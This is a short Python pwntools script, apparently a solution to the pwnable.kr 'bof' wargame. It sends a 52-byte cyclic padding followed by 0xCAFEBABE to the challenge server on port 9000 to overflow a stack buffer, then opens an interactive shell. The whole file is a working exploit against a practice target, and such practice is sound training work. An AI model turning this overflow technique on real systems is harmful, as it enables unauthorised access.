from pwn import *

padding = cyclic(52)
pay = padding + p32(0xCAFEBABE)

# with open("payload", "wb") as f:
#     f.write(pay)
r = remote("pwnable.kr", 9000)
r.sendline(pay)
r.interactive()
